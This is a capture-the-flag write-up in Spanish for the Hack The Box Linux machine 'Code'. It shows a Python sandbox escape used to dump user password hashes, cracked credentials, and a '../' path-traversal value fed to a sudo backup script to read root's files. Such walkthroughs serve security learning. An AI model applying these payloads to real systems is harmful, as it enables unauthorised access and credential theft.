# Hack The Box - Code
**Plataforma:** Hack The Box  
**Categoría:** Linux  
**Dificultad:** Fácil - Media  
**Fecha de resolución:** Abril 2025  

---
![image](https://github.com/user-attachments/assets/1337cd0e-efee-4989-b439-b676ab9ac6c8)

---
## Información de la máquina
- **IP:** `10.10.11.X`
- **Sistema Operativo:** Linux
- **Técnicas principales:** SSH, JSON, Bypass, Escalar privilegios, nmap.

---

## 1. Enumeración inicial

Realizamos un escaneo de puertos:
```bash
nmap -sC -sV -oN nmap_scan.txt 10.10.11.X
```
Descubrimos:
- **22/tcp** — OpenSSH 8.2p1
- **5000/tcp** — Gunicorn 20.0.4 (Servidor Web Python)
- Título Web: **Editor de Código Python**

### 2. Interacción con el servidor web (Puerto 5000)

Accedemos mediante navegador:

`http://10.10.11.X:5000`

Observamos que podemos ejecutar fragmentos de código Python en un editor web.

### 3. Bypass del Sandbox de Python

Dentro del editor, escribimos:

```python
raise Exception(globals())
```

Esto permitió listar todas las variables globales, incluyendo el modelo `User` de la base de datos.

### 4. Extracción de Usuarios y Hashes

Usamos un pequeño snippet:

```python
print([(user.id, user.username, user.password) for user in User.query.all()])
```

Usuarios encontrados:

- `development` : `759b74ce43947f5f4c91aeddc3e5bad3`
- `martin` : `3de6f30c4a09c27fc71932bfc68474be`

### 5. Crackeo de Hashes

Usamos **CrackStation** para descifrar los hashes MD5.

Resultado:

- `development : development`
- `martin : nafeelswordsmaster`

---
## User flag - Acceso a martin y extracción de user.txt
## 1. Acceso SSH como martin
```bash
ssh martin@10.10.11.62
```
Contraseña: nafeelswordsmaster

## 2. Análisis del script `backy.sh`

Dentro de la máquina, encontramos el script en `/usr/bin/backy.sh`.

Descubrimos que:

- Realiza respaldos basados en `task.json`.
- Permite rutas solo bajo `/home/` o `/var/`.
- Intenta limpiar rutas relativas (`../`).

## 3. Creación de task.json para user.txt
```bash
{
  "destination": "/home/martin/",
  "multiprocessing": true,
  "verbose_log": true,
  "directories_to_archive": [
    "/home/app-production/user.txt"
  ],
  "exclude": [".*"]
}
```
## 4. Ejecución del backup

```bash
sudo /usr/bin/backy.sh task.json
```

## 5. Extracción:

```bash
tar -xvjf code_home_app-production_user.txt_2025_April.tar.bz2
cat user.txt
```

🎯 **User Flag obtenida.**
---
## **Root flag - Escalada de Privilegios y extracción de `root.txt`**

### 1. Creación de `task.json` para root

```json
{
  "directories_to_archive": [
    "/home/../root/"
  ],
  "destination": "/tmp"
}
```

**Notas:**

- Se usa `../` para evadir la validación.
- Se almacena el backup en `/tmp` para mayor control.
  
## 2. Ejecución del backup para root

```bash
sudo /usr/bin/backy.sh task.json
```

Archivo generado:
```bash
/tmp/code_home_.._root_2025_April.tar.bz2
```
## 3.Extracción y obtención de `root.txt`

```bash
cd /tmp
tar -xvjf code_home_.._root_2025_April.tar.bz2
cat root/root.txt
```

🎯 **Root Flag obtenida.**

---

## Notas y Lecciones Aprendidas
- **Bypass de filtros:** Incluso cuando se eliminan `"../"`, hay formas creativas como manipular rutas para lograr path traversal.
- **Backup scripts mal configurados:** Pueden ser una grave amenaza si se ejecutan como `sudo` sin correcta validación de paths.
- **Importancia de la validación de entrada:** Sanitizar correctamente la entrada del usuario es crítico en aplicaciones web y scripts.

✨ Writeup by Adrian (@TheAdriansher)
